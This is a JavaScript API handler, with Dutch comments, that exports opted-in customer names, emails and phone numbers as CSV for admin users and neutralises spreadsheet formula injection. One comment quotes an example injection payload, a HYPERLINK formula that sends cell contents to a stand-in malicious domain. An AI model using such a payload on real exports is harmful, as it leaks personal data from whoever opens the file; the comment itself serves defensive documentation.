const store = require("../../../lib/store-sql");
const { requireStaff } = require("../../../lib/auth");

// De namen in deze export komen uit het publieke boekingsformulier en worden
// serverside niet beperkt. Escapen van komma's en aanhalingstekens alleen is
// daarom niet genoeg: Excel en LibreOffice behandelen een cel die met = + - @
// (of een tab/CR) begint als FORMULE. Iemand kan dus boeken onder de naam
//   =HYPERLINK("https://kwaadaardig.be/?x="&A1&B1;"klik")
// en die formule draait zodra jij het bestand opent — met je volledige
// e-maillijst als buit. Een apostrof ervoor dwingt de spreadsheet de cel als
// tekst te lezen. Zie het veiligheidsrapport van 19-08-2026.
function neutralizeFormula(str) {
  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
}

function csvEscape(value) {
  const raw = value === null || value === undefined ? "" : String(value);
  const str = neutralizeFormula(raw);
  if (/[",\n\r]/.test(str)) return `"${str.replace(/"/g, '""')}"`;
  return str;
}

// GET /api/admin/customers-export
// CSV-download van klant-e-mailadressen verzameld via boekingen (widget +
// backoffice), beperkt tot wie toestemming gaf voor nieuws/promoties
// (marketing_opt_in). Bedoeld om samen te voegen met de Wix-abonneelijst
// voor een nieuwsbrief. Bevat persoonsgegevens — daarom enkel voor Admin,
// niet voor de Gast-rol.
export default async function handler(req, res) {
  const session = requireStaff(req, res);
  if (!session) return;
  if (session.role !== "admin") {
    return res.status(403).json({ error: "Enkel toegankelijk voor Admin." });
  }

  if (req.method !== "GET") {
    res.setHeader("Allow", "GET");
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const customers = await store.listMarketingEmails();
    const header = "naam,email,telefoon,klant_sinds";
    const lines = customers.map(c =>
      [c.name, c.email, c.phone || "", c.createdAt ? new Date(c.createdAt).toISOString().slice(0, 10) : ""]
        .map(csvEscape)
        .join(",")
    );
    const csv = [header, ...lines].join("\n");
    const today = new Date().toISOString().slice(0, 10);

    res.setHeader("Content-Type", "text/csv; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="aar-emaillijst-${today}.csv"`);
    return res.status(200).send(csv);
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }
}
